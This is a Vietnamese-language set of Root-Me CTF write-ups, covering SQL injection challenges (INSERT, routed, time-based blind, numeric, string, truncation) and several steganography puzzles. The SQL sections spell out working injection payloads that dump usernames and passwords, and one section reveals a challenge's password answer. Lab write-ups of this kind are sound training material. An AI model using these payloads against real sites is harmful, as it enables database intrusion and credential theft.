+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---insert"><a class="header" href="#sql-injection---insert"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert">SQL injection - Insert</a></a></h1>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image1.png" alt="" /></p>
+<p>Website cho ta 2 tab gồm authentication và register. Ở Register, ta có thể tùy ý tạo được account và không hề có filter input.</p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image2.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image3.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image4.png" alt="" /></p>
+<p>Từ đó, ta xác định chỗ để tiêm vào database. Ở tab register, ta có thể thấy website yêu câu 3 field gồm username, password và email. Do đó, database sẽ thực hiện tạo user theo kiểu:
+<code>INSERT INTO users VALUES (username, password, email)</code></p>
+<p>Trong khi đó, website không hề filter email field và ta có thể lợi dụng bug này để có thể INSERT thêm các giá trị ta muốn với multiple insertions và tấn công vào email field.</p>
+<p><strong>Payload:</strong> <code>INSERT INTO users VALUES (username, password, email), (sth, sth, attack_payload)-- -</code></p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image5.png" alt="" /></p>
+<p>Login vào account, <code>ss, ss, (select version()):</code></p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image6.png" alt="" /></p>
+<ul>
+<li>Database version(): <code>10.3.34-MariaDB-0ubuntu0.20.04.1</code></li>
+</ul>
+<p>Tiếp tục, ta cần fuzz để tìm ra được table và column, nhưng khi thử thì bị message <strong>“Request failed”</strong> cho đến khi sử dụng LIMIT thì mới biết là nó bị giới hạn:</p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image7.png" alt="" /></p>
+<p>Thử sử dụng trick với OFFSET thì được response <strong>“Attack detected”.</strong></p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image8.png" alt="" /></p>
+<p>Login vào account vừa INSERT, ta biết được 1 table:</p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image9.png" alt="" /></p>
+<p>Sử dụng <strong>GROUP_CONCAT</strong> để show các table nhưng có vẻ không có tables nào có thông tin user hoặc flag mà toàn là các table khác.:</p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image10.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image11.png" alt="" /></p>
+<p>Thử xem lại version, ta thấy server sử dụng MariaDB. Sau một hồi stuck và check cheatsheet, ta có thể sử dụng <strong>information_schema.processlist</strong> để check các thread đang thực thi của server database (vì user có thể reg bất cứ lúc nào). Lúc này, ta có thể kiểm tra table <strong>INFO</strong> để có thể xem server sẽ thực thi cái gì khi reg account (<a href="https://mariadb.com/kb/en/information-schema-processlist-table/">Information Schema PROCESSLIST Table - MariaDB Knowledge Base</a>):</p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image12.png" alt="" /></p>
+<p>Reg acc để show table <strong>INFO</strong> của <strong>information_schema.processlist</strong>:</p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image13.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image14.png" alt="" /></p>
+<p>Payload thực thi của server:</p>
+<p><em><strong>INSERT INTO <code>membres</code> ( <code>username</code>, <code>password</code>, <code>email</code>)</strong></em></p>
+<ul>
+<li>Table cần tìm: <strong>membres</strong></li>
+</ul>
+<p>Show các column của membres table:</p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image15.png" alt="" /></p>
+<p>Tuy vậy, ta chẳng kiếm được bất kỳ thông tin nào từ bảng membres này cả</p>
+<p>Sau 2 tiếng stuck, vì quá bất lực, em quyết định sử dụng burpsuite để bruteforce tất cả các table của <strong>information_schema.tables:</strong></p>
+<ul>
+<li>Auto register account:</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image16.png" alt="" /></p>
+<ul>
+<li>Auto login:</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image17.png" alt="" /></p>
+<ul>
+<li>Sau khi xem qua các table mà bruteforce giúp ta leak, ta đã tìm được đúng table cần tìm :</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image18.png" alt="" /></p>
+<p>Đến đây, ta thực hiện tìm column trong flag table:</p>
+<ul>
+<li>Payload: <code>username=uuysyy&amp;password=123&amp;email=gg'),('cgc','123',(select column_name from information_schema.columns where table_name='flag' limit 0,1))-- -</code></li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image19.png" alt="" /></p>
+<p>Giờ thì tìm flag: <code>username=sadadas&amp;password=123&amp;email=gg'),('cvb','123',(select flag from flag limit 0,1))-- -</code></p>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image20.png" alt="" /></p>
+<ul>
+<li>Flag: ******************************</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Insert/./media/image21.png" alt="" /></p>
+<ul>
+<li>Flag: ******************************</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection-routed"><a class="header" href="#sql-injection-routed"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed">SQL-Injection-Routed</a></a></h1>
+<p><img src="SQL-Injection/SQLinjection-Routed/./media/image1.png" alt="" /></p>
+<p>Thử login và intercept request, ta có được kết quả:</p>
+<p><img src="SQL-Injection/SQLinjection-Routed/./media/image2.png" alt="" /></p>
+<p>Có vẻ như khó có thể bypass được ở hàm login này khi request trả về:</p>
+<p><img src="SQL-Injection/SQLinjection-Routed/./media/image3.png" alt="" /> Chuyển qua tab Search, khi query ta đều nhận được kết quả trả về dựa trên query:</p>
+<p><img src="SQL-Injection/SQLinjection-Routed/./media/image4.png" alt="" /></p>
+<p>Ta sẽ attack vào đây với payload <code>‘ union select 1 from information_schema-- -</code> thì nhận được response <strong>“Attack detected!”</strong>:</p>
+<p><img src="SQL-Injection/SQLinjection-Routed/./media/image5.png" alt="" /> Thử fuzz ta biết được, input sẽ filter các ký tự như ‘,’, các ký tự có thể liên quan đến SQLi. Tuy nhiên không filter một vài từ như union, select,…</p>
+<p>Tìm hiểu về Routed SQL (<a href="https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt">https://repository.root-me.org/Exploitation - Web/EN - Routed SQL Injection - Zenodermus Javanicus.txt</a>) ta có thể tìm được thông tin:</p>
+<p>In simple words routed SQL injection can be a scenario when you are not able to see any output after using "union select", earlier when i was playing with SQLi i found a website where i wasnt getting any output so it just striked through my mind that may be the output is not coming to the page then it must be going somewhere, and that somewhere is an another sql query.</p>
+<p>Nghĩ là, khi ta inject với union select thì sẽ không thể thấy được input của câu inject đó.</p>
+<p>Payload: <code>'union select login,password from users-- -</code></p>
+<p>Convert sang hexa: <code>0x27756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d202d</code></p>
+<p><img src="SQL-Injection/SQLinjection-Routed/./media/image6.png" alt="" /></p>
+<ul>
+<li>Flag: *********************</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection--time-based"><a class="header" href="#sql-injection--time-based"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based">SQL Injection – Time-based</a></a></h1>
+<p>Về SQLi Time-based, đây là một loại SQLi Blind khi ta sử dụng thời gian res của req để dự đoán thông tin và BurpSuite sẽ hỗ trợ rất tốt về mảng này. Khi ta sử dụng một câu Query đúng, thời gian phản hồi sẽ chậm và ngược lại.</p>
+<p>Trong website, ta có một tab là Memberlist, có query như sau:</p>
+<p><em>http://challenge01.root-me.org/web-serveur/ch40/?action=memberlist&amp;member=<strong>[x]</strong></em></p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image1.png" alt="" /></p>
+<p>Ở đây, ta có thể lợi dụng để thực hiện tiêm payload vào đằng sau nó và thực hiện blind. Thử blind với payload bằng nhiều version() database khác nhau:</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image2.png" alt="" /></p>
+<p>Payload: <em>3;select+case+when+(0=0)+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
+<p>Payload này sẽ khiến dtb res chậm hơn với pg_sleep() khi query đúng.</p>
+<ul>
+<li>Server thuộc dạng Postgresql: <a href="https://pgpedia.info/p/pg_sleep.html">pg_sleep() - pgPedia - a PostgreSQL Encyclopedia</a></li>
+</ul>
+<p>Từ đó, ta sẽ sử dụng Burp Intruder để thực hiện bruteforce table_name, column_name như các bài SQLi đã làm.</p>
+<ol>
+<li><strong>Tìm table_name</strong></li>
+</ol>
+<p>Trước tiên, ta cần tìm kiếm độ dài của table:</p>
+<p>Payload: <em><strong>3;select+case+when+((select+length(table_name)+from+information_schema.tables+limit+1)=[length])+then+pg_sleep(10)+else+pg_sleep(-1)+end—</strong></em></p>
+<p>Đưa vào Intruder và bruteforce:</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image3.png" alt="" /></p>
+<p>Ở bảng kết quả, ta filter lại cột “Response Complete”. Res nào có độ lớn cao nhất thì chắc hẳn đó là payload đúng.</p>
+<ul>
+<li>length(table_name) == 5</li>
+</ul>
+<p>Đã có table_name, ta tiến hành bruteforce table_name. Bỏ vào intruder:</p>
+<p><em>member=3;select+case+when+(substr((select+table_name+from+information_schema.tables+limit+1),<strong>§1§</strong>,1)=chr(<strong>§§</strong>))+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image4.png" alt="" /></p>
+<p>Ghép lại ta được <strong>table_name=users</strong></p>
+<ol>
+<li><strong>Tìm column_name</strong></li>
+</ol>
+<p>Tương tự như table_name, ta tìm length(column_name) của cột đầu tiên:</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image5.png" alt="" /></p>
+<p>Kết quả trả về payload length(column_name) = 2. Ta có thể dự đoán nó có thể là ‘id’. Kiểm chứng bằng Repeater:</p>
+<ul>
+<li>Ký tự ‘i’:</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image6.png" alt="" /></p>
+<ul>
+<li>Ký tự ‘d’:</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image7.png" alt="" /></p>
+<ul>
+<li>Cả 2 response đều tốn 2,285 miliseconds (tương tự thời gian fuzz, khác với response thông thường ~ 200 – 300 milisecond) column[0] == id</li>
+</ul>
+<p>Để tìm được column tiếp theo, ta sử dụng offset để filter lại và thực hiện tương tự, bruteforce thôi:</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image8.png" alt="" /></p>
+<ul>
+<li>length(column[2]) == 8</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image9.png" alt="" /></p>
+<ul>
+<li>column_name[1] = username</li>
+</ul>
+<p>Column[2], có length == 9:</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image10.png" alt="" /></p>
+<p>Bruteforce được kết quả column_name[2] == firstname:</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image11.png" alt="" /></p>
+<p>Tương tự, column[3] có length == 8, và dễ dàng đoán được:</p>
+<ul>
+<li>column_name[3] == lastname:</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image12.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image13.png" alt="" /></p>
+<p>Column[4] có length == 5. Suy đoán và thử được kết quả:</p>
+<ul>
+<li>column_name[4] == email</li>
+</ul>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image14.png" alt="" /></p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image15.png" alt="" /></p>
+<p>column[5] có độ dài ký tự là length == 8:</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image16.png" alt="" /></p>
+<p>Vì length ==8, ta thử kiểm chứng keyword = ‘password’ thì thấy trùng khớp:</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image17.png" alt="" /></p>
+<p>Như vậy, ta đã tìm được đúng cột password, giờ thì tìm password của admin. Admin có id=1, ta chỉ cần tìm kiếm với offset = 0 là sẽ ra.</p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image18.png" alt="" /></p>
+<ul>
+<li><strong>length(password) == 13</strong></li>
+</ul>
+<p>Sau hơn 1 ngày bruteforce với payload, ta được kết quả:</p>
+<p><em>member=3;select+case+when+(substr((select+password+from+users+limit+1+offset+0),<strong>§§</strong>,1)=chr(<strong>§§</strong>))+then+pg_sleep(10)+else+pg_sleep(-1)+end--</em></p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image19.png" alt="" /></p>
+<p>Ta có được chuỗi ascii password: <strong>84 33 109 51 66 64 115 51 68 83 81 76 33</strong></p>
+<p>Convert to text: <strong>T!m3B@s3DSQL!</strong></p>
+<p><img src="SQL-Injection/SQLinjection-Time-based/./media/image20.png" alt="" /></p>
+<p><strong>Flag:</strong> T!m3B@s3DSQL!</p>
+<p>- Flag:</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---numeric"><a class="header" href="#sql-injection---numeric"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric">SQL injection - Numeric</a></a></h1>
+<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image1.png" alt="" /></p>
+<p>Thử bypass qua login thì không thể thực hiện được.</p>
+<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image2.png" alt="" /></p>
+<p>Kiểm tra các thẻ khác trong Home vì nhận thấy điều đặc biệt rằng, 3 link này đều dẫn đến <strong>action=news&amp;news_id=[x].</strong> Thử xóa id của news thì phát hiện database bị lỗi:</p>
+<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image3.png" alt="" /></p>
+<p>Database của server là SQLite3. Tương tự bài SQL Injection – String, ta thực hiện inject nó để tìm ra admin. Ta dò được số cột là 3:</p>
+<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image4.png" alt="" /></p>
+<p>Payload: <a href="http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1%20union%20select%201,1,1%20from%20sqlite_master">challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1 union select 1,1,1 from sqlite_master</a></p>
+<p>Ta dò được có 2 bảng users và news:</p>
+<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image5.png" alt="" /></p>
+<p>Payload: <a href="http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1%20union%20select%201,1,name%20from%20sqlite_master">challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1 union select 1,1,name from sqlite_master</a></p>
+<p>Tương tự bài String, ta show ra được username và password của users:</p>
+<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image6.png" alt="" /></p>
+<p>Payload: <a href="http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1%20union%20select%201,username,password%20from%20users">challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1 union select 1,username,password from users</a></p>
+<p>Login vào thành công:</p>
+<p><img src="SQL-Injection/SQLinjectionnumeric/./media/image7.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection---string"><a class="header" href="#sql-injection---string"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String">SQL injection - String</a></a></h1>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image1.png" alt="" /></p>
+<p>Thử SQLi ở thẻ Login thì không bypass được, ta qua thẻ Search để thử. Ở thẻ này có vẻ khả thi hơn vì nó có thực hiện query theo input của ta. Ví dụ:</p>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image2.png" alt="" /></p>
+<p>Đầu tiên, thử với payload đơn giản <strong>1’ or 1=1--</strong> , thì phát hiện nó đã bị SQLi thành công:</p>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image3.png" alt="" /></p>
+<p>Ta thực hiện blind SQL để tìm kiếm thông tin infor của admin để có thể login. Ta thử với payload <strong>1’ union select 1</strong> , thì nhận về lỗi sau:</p>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image4.png" alt="" /></p>
+<p>Có thể biết được server sử dụng SQLite3, từ đó, công việc của ta cần sử dụng cú pháp của SQLite3 để mò ra các table trong database với hi vọng tìm được admin. Nhưng trước tiên, ta cần phải thực hiện dò số cột. Thay payload thành <strong>1’ union select 1,1--</strong> thì có vẻ đã tìm được số cột là 2:</p>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image5.png" alt="" /></p>
+<p>Vì server dùng SQLite3, do vậy, ta cần truy vẫn các table bằng cách tìm trong <strong>sqlite_master</strong> hoặc <strong>sqlite_schema.</strong> Thử truy vấn với payload <strong>1’ union select 1,name from sqlite_master--</strong> ta có:</p>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image6.png" alt="" /></p>
+<p>Tiếp tục, ta blind vào table users <em>1' union select 1,1 from users--</em></p>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image7.png" alt="" /></p>
+<p>Tiếp tục, ta thử query tìm username và password với payload <strong>1' union select username,password from users-- :</strong></p>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image8.png" alt="" /></p>
+<p>Thử login thì thành công:</p>
+<p><img src="SQL-Injection/SQLinjectionstring/./media/image9.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-truncation"><a class="header" href="#sql-truncation"><a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation">SQL Truncation</a>**</a></h1>
+<p><img src="SQL-Injection/SQLTruncation/./media/image1.png" alt="" /></p>
+<p><strong>SQL Truncation</strong> là lỗ hổng xảy ra khi user input vượt qua các điều kiện của database khiến database xung đột và gây ra hiện tượng thiếu xác thực.</p>
+<p>Ở challenge này, ta phải mạo danh admin và login vào tab của admin. Đầu tiên, ta kiếm tra sources code và thấy được comment về các query khi register:</p>
+<p><img src="SQL-Injection/SQLTruncation/./media/image2.png" alt="" /></p>
+<p>Ở username và password, ta có thể thấy, database giới hạng length = 12 (login) và length = 32 (password). Như vậy, ta thử attack vào username với payload:</p>
+<ul>
+<li>
+<p><strong>Username:</strong> admin hehehehe (7 whitespace)</p>
+</li>
+<li>
+<p><strong>Password:</strong> somethinghere</p>
+</li>
+</ul>
+<p><img src="SQL-Injection/SQLTruncation/./media/image3.png" alt="" /></p>
+<p>Khi này, ta nhận được thông báo “User saved”. Theo SQL Truncations, lúc này, thông tin login của ta sẽ bị truncate thành:</p>
+<ul>
+<li>
+<p><strong>Username</strong>: admin</p>
+</li>
+<li>
+<p><strong>Password (new)</strong>: somethinghere</p>
+</li>
+</ul>
+<p>Ta chuyển qua tab Administrator, login vào bằng password vừa tạo:</p>
+<p><img src="SQL-Injection/SQLTruncation/./media/image4.png" alt="" /></p>
+<p>Ta nhận được flag sau khi login!</p>
+<ul>
+<li>Flag: *********************</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="steganography"><a class="header" href="#steganography">Steganography</a></h1>
+<p>Root-me link for this subject: <a href="https://www.root-me.org/en/Challenges/Steganography/">https://www.root-me.org/en/Challenges/Steganography/</a></p>
+<h2 id="table-of-contents"><a class="header" href="#table-of-contents">Table Of Contents</a></h2>
+<ul>
+<li><a href="Steganography/index.html#exif---metadata">EXIF - Metadata</a></li>
+<li><a href="Steganography/index.html#dot-and-next-line">Dot and next line</a></li>
+<li><a href="Steganography/index.html#steganomobile">Steganomobile</a></li>
+<li><a href="Steganography/index.html#twitter-secret-messages">Twitter Secret Messages</a></li>
+<li><a href="Steganography/index.html#poem-from-space">Poem from Space</a></li>
+<li><a href="Steganography/index.html#yellow-dots">Yellow dots</a></li>
+<li><a href="Steganography/index.html#wav---noise-analysis">WAV - Noise analysis</a></li>
+<li><a href="Steganography/index.html#exif---thumbnail">EXIF - Thumbnail</a></li>
+<li><a href="Steganography/index.html#wav-spectral-analysis">WAV-Spectral-analysis</a></li>
+<li><a href="Steganography/index.html#apng--just-a-png">APNG – Just a PNG</a></li>
+<li><a href="Steganography/index.html#txt---george-and-alfred">TXT - George and Alfred</a></li>
+<li><a href="Steganography/index.html#embedded-pdf">Embedded PDF</a></li>
+<li><a href="Steganography/index.html#kitty-spy">Kitty spy</a></li>
+<li><a href="Steganography/index.html#crypto-art">Crypto Art</a></li>
+<li><a href="Steganography/index.html#png---pixel-indicator-technique">PNG - Pixel Indicator Technique</a></li>
+<li><a href="Steganography/index.html#png---pixel-value-differencing">PNG - Pixel Value Differencing</a></li>
+</ul>
+<hr />
+<h2 id="exif---metadata"><a class="header" href="#exif---metadata">EXIF - Metadata</a></h2>
+<p>Link challenges: <a href="https://www.root-me.org/en/Challenges/Steganography/EXIF-Metadata">https://www.root-me.org/en/Challenges/Steganography/EXIF-Metadata</a></p>
+<p>Sử dụng tool để xem exifdata: <a href="https://www.metadata2go.com/">https://www.metadata2go.com/</a></p>
+<p>Ta tìm được GPS location: <strong>43 deg 17' 56.27" N, 5 deg 22' 49.38" E</strong></p>
+<p><img src="Steganography/./media/image1.png" alt="" /></p>
+<p>Sử dụng Google Maps để định vị location ta tìm được địa chỉ tại: <strong>2 Pl. des Capucines, 13001 Marseille, France:</strong></p>
+<p><img src="Steganography/./media/image2.png" alt="" /></p>
+<p>Flag là thành phố nơi chụp bức ảnh.</p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image3.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="dot-and-next-line"><a class="header" href="#dot-and-next-line">Dot and next line</a></h2>
+<p>Hình ảnh được cho:</p>
+<img src="Steganography/./media/image4.jpeg" style="width:5.58276in;height:4.35606in" alt="Text, letter Description automatically generated" />
+<p>Chú ý vào title của challenge, ta có ‘dot’ và ‘next line’ là hai keyword. Chú ý vào hình ảnh được cho, ta có thể thấy được sự sắp xếp ngẫu nhiên và không có quy tắc của các dấu chấm và cả xuống dòng.</p>
+<p>Từ tên của challenge, ta đặt ra 2 giả thuyết:</p>
+<p>- Ghép các ký tự bên dưới dấu chấm lại với nhau (dot and next line)</p>
+<p>- Và ngược lại (line and next dot)</p>
+<p>Từ đó, ta có 2 kết quả:</p>
+<p>- urpa de (không có nghĩa và dư thừa khoảng trắng)</p>
+<p>- chatelet15h</p>
+<p>Submit và thành công</p>
+<p><strong>Flag</strong>: *******</p>
+<p><img src="Steganography/./media/image5.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="steganomobile"><a class="header" href="#steganomobile">Steganomobile</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Steganomobile">https://www.root-me.org/en/Challenges/Steganography/Steganomobile</a></p>
+<p><img src="Steganography/./media/image6.png" alt="" /></p>
+<p>Sử dụng công cụ <a href="https://dcode.fr">https://dcode.fr</a> để decode nó dưới dạng Multi-Tap Phone ta được kết quả là CELLPHONE.</p>
+<p><img src="Steganography/./media/image7.png" alt="" /></p>
+<p>Thử nhập kết quả nhưng sai. Chuyển sang lowercase thì submit thành công!</p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image8.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="twitter-secret-messages"><a class="header" href="#twitter-secret-messages">Twitter Secret Messages</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Twitter-Secret-Messages">https://www.root-me.org/en/Challenges/Steganography/Twitter-Secret-Messages</a></p>
+<p>Sử dụng công cụ Twtitter Secret Message: <a href="https://holloway.nz/steg/">https://holloway.nz/steg/</a></p>
+<p><img src="Steganography/./media/image9.png" alt="" /></p>
+<p>Ta nhận được message: <strong>rendezvous at grand central terminal on friday.</strong></p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image10.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="poem-from-space"><a class="header" href="#poem-from-space">Poem from Space</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Poem-from-Space">https://www.root-me.org/en/Challenges/Steganography/Poem-from-Space</a></p>
+<p><img src="Steganography/./media/image11.png" alt="" /></p>
+<p>Bôi đen file, ta thấy được file có lồng thêm những khoảng trắng (whitespace):</p>
+<p><img src="Steganography/./media/image12.png" alt="" /></p>
+<p>Đây có thể là Whitespace Language. Ta remove các ký tự latin đằng trước đi và để lại các khoảng trắng dư thừa.</p>
+<p>Sử dụng công cụ Whitespace Language decode để decode:</p>
+<p><img src="Steganography/./media/image13.png" alt="" /></p>
+<p><strong>Flag:</strong> RootMe{*******}</p>
+<p><img src="Steganography/./media/image14.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="yellow-dots"><a class="header" href="#yellow-dots">Yellow dots</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/Yellow-dots">https://www.root-me.org/en/Challenges/Steganography/Yellow-dots</a></p>
+<p><img src="Steganography/./media/image15.png" alt="" /></p>
+<p>Tên bài là Yellow dots, ta có thể liên tưởng đến printer. Sử dụng stegsolve để tìm ra điểm khác biệt trong file ảnh:</p>
+<p><img src="Steganography/./media/image16.png" alt="" /></p>
+<p>Hình ảnh khác biệt hiện ra, ta có thể dò nó theo printer serial:</p>
+<p><img src="Steganography/./media/image17.png" alt="" /></p>
+<p>Ta có bảng dò như sau:</p>
+<p><img src="Steganography/./media/image18.png" alt="" /></p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image19.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="wav---noise-analysis"><a class="header" href="#wav---noise-analysis">WAV - Noise analysis</a></h2>
+<p>Link:<a href="https://www.root-me.org/en/Challenges/Steganography/WAV-Noise-analysis">https://www.root-me.org/en/Challenges/Steganography/WAV-Noise-analysis</a></p>
+<p>Đề bài là một file ch3.wav. Mở lên nghe thì rất khó chịu. Phân tích metadata thì không thu thập được bất cứ gì.</p>
+<p>Sử dụng công cụ Audicity để modify âm thanh. Sau nhiều lần thử thì công thức cho ra được một đoạn voice tiếng anh là: Speed Low (giảm còn 30%) + Reverse (đảo ngược đoạn âm thanh):</p>
+<p><img src="Steganography/./media/image20.png" alt="" /></p>
+<p>Nghe lại ta có được flag: <strong>3b27641fc5h0</strong></p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image21.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="exif---thumbnail"><a class="header" href="#exif---thumbnail">EXIF - Thumbnail</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/EXIF-Thumbnail">https://www.root-me.org/en/Challenges/Steganography/EXIF-Thumbnail</a></p>
+<p>Strings thử file thì thấy mấy không tìm được gì đặc biệt, kể cả exiftool:</p>
+<p><img src="Steganography/./media/image22.png" alt="" /></p>
+<p>Sử dụng công cụ bóc tách thumbnail, <a href="https://29a.ch/photo-forensics/#thumbnail-analysis">https://29a.ch/photo-forensics/#thumbnail-analysis</a>, ta được flag:</p>
+<p><img src="Steganography/./media/image23.png" alt="" /></p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image24.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="wav-spectral-analysis"><a class="header" href="#wav-spectral-analysis">WAV-Spectral-analysis</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/WAV-Spectral-analysis">https://www.root-me.org/en/Challenges/Steganography/WAV-Spectral-analysis</a></p>
+<p>Sử dụng Audicity tool và chọn chế độ Spectogram để xem. Ta có thể xem được sóng và nó hình thành đoạn text:</p>
+<p><img src="Steganography/./media/image25.png" alt="" /></p>
+<p><strong>Flag:</strong> *******</p>
+<p><img src="Steganography/./media/image26.png" alt="" /></p>
+<blockquote>
+<p>Back to <a href="Steganography/index.html#table-of-contents">Table Of Contents</a></p>
+</blockquote>
+<hr />
+<h2 id="apng--just-a-png"><a class="header" href="#apng--just-a-png">APNG – Just a PNG</a></h2>
+<p>Link: <a href="https://www.root-me.org/en/Challenges/Steganography/APNG-Just-A-PNG">https://www.root-me.org/en/Challenges/Steganography/APNG-Just-A-PNG</a></p>
+<p>Exiftool kiểm tra file:</p>
+<p><img src="Steganography/./media/image27.png" alt="" /></p>
+<p>Sử dụng công cụ APNG Disassembler 2.9 để extract .apng ra nhiều frame:</p>
+<p><img src="Steganography/./media/image28.png" alt="" /></p>
+<p>Kiểm tra thư mục xuất ra thì có các file text là frame data. Mở các file đầu lên thì thấy các thông số frame có vẻ như đã bị ASCII hóa. Thử dịch ngược lại 4 file đầu thì ra chữ FLAG (70 76 65 71):</p>
+<p><img src="Steganography/./media/image29.png" alt="" /></p>
+<p>Sử dụng python để decode và ta được flag:</p>
